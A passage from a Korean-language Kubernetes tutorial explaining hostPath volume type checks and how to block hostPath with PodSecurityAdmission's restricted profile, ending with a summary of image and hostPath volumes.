`hostPath` 볼륨에 `type`을 지정하여, 경로가 컨테이너 프로세스가 기대하는 형태(파일, 디렉터리 등)인지 확인할 수 있다. 지정 경로가 타입과 일치하지 않으면 Pod의 컨테이너가 실행되지 않는다.

| 타입 | 설명 |
| --- | --- |
| (빈 문자열) | 볼륨 마운트 전 아무런 검사를 하지 않는다 |
| `Directory` | 지정 경로에 디렉터리가 존재하는지 확인한다. 기존 디렉터리를 마운트하고, 없으면 Pod 실행을 막고 싶을 때 사용한다 |
| `DirectoryOrCreate` | `Directory`와 동일하지만, 경로에 아무것도 없으면 빈 디렉터리를 생성한다 |
| `File` | 지정 경로가 파일이어야 한다 |
| `FileOrCreate` | `File`과 동일하지만, 경로에 아무것도 없으면 빈 파일을 생성한다 |
| `BlockDevice` | 지정 경로가 블록 디바이스여야 한다 |
| `CharDevice` | 지정 경로가 캐릭터 디바이스여야 한다 |
| `Socket` | 지정 경로가 UNIX 소켓이어야 한다 |

> **Note:** `FileOrCreate` 또는 `DirectoryOrCreate` 타입에서 Kubernetes가 파일/디렉터리를 생성할 때, 파일 권한은 각각 644(`rw-r--r--`)와 755(`rwxr-xr-x`)로 설정된다. 어느 경우든 kubelet을 실행하는 사용자 및 그룹이 소유자가 된다.

<br>

# 실무 관점: PodSecurityAdmission으로 hostPath 차단

hostPath의 위험성을 인지했다면, 프로덕션 환경에서는 **PodSecurityAdmission**을 사용하여 hostPath 사용을 제한해야 한다. PodSecurityAdmission은 네임스페이스 레벨에서 Pod 보안 표준(Pod Security Standards)을 강제하는 내장 admission controller다.

세 가지 프로파일이 있다.

| 프로파일 | hostPath 허용 | 대상 |
| --- | --- | --- |
| **privileged** | O | 시스템 데몬, 인프라 컴포넌트 |
| **baseline** | O (제한적) | 일반 워크로드의 기본 보안 |
| **restricted** | X | 보안이 중요한 워크로드 |

```bash
# 네임스페이스에 restricted 프로파일 적용
kubectl label namespace my-app \
  pod-security.kubernetes.io/enforce=restricted \
  pod-security.kubernetes.io/warn=restricted

# hostPath를 사용하는 Pod 생성 시도 → 차단됨
# Error: ... violates PodSecurity "restricted:latest": hostPath volumes ...
```

`restricted` 프로파일이 적용된 네임스페이스에서는 hostPath 볼륨을 사용하는 Pod가 생성 자체가 거부된다. 시스템 레벨 Pod(kube-system 등)는 privileged로 유지하고, 일반 워크로드 네임스페이스에는 restricted를 적용하는 것이 권장 패턴이다.

<br>

# 정리

- `image` 볼륨은 OCI 이미지의 파일을 컨테이너를 실행하지 않고 직접 마운트하는 볼륨 타입이다. 기존의 init 컨테이너 + emptyDir 조합을 대체할 수 있으며, 이미지를 순수한 파일 패키징/배포 매체로 활용할 수 있게 한다
- `hostPath` 볼륨은 노드의 파일 시스템 경로를 Pod에 마운트한다. 시스템 레벨 Pod(로그 수집기, 모니터링 에이전트 등)에서 주로 사용되며, 일반 워크로드에서는 보안 위험 때문에 권장되지 않는다
- `hostPath: /`는 노드의 root 접근 권한과 동일하다. Secret 탈취, kubelet 인증서 도용, 노드 백도어 삽입 등의 공격이 가능하므로, PodSecurityAdmission의 `restricted` 프로파일로 사용을 반드시 제한해야 한다

<br>
